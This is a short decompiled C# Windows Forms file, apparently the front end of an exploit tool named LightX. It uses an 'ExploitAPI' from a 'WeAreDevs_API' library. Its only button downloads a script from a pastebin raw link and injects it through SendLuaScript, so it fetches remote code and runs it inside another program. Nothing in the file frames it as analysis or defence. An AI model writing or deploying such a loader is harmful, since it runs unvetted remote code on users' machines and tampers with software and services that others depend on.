using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using WeAreDevs_API;

namespace LightX
{
	// Token: 0x02000004 RID: 4
	public partial class LXAdapt : Form
	{
		// Token: 0x06000019 RID: 25 RVA: 0x000036D9 File Offset: 0x000018D9
		public LXAdapt()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000036FC File Offset: 0x000018FC
		private void button1_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("https://pastebin.com/raw/GPXTBHfP");
			this.module.SendLuaScript(text);
		}

		// Token: 0x04000018 RID: 24
		private ExploitAPI module = new ExploitAPI();
	}
}
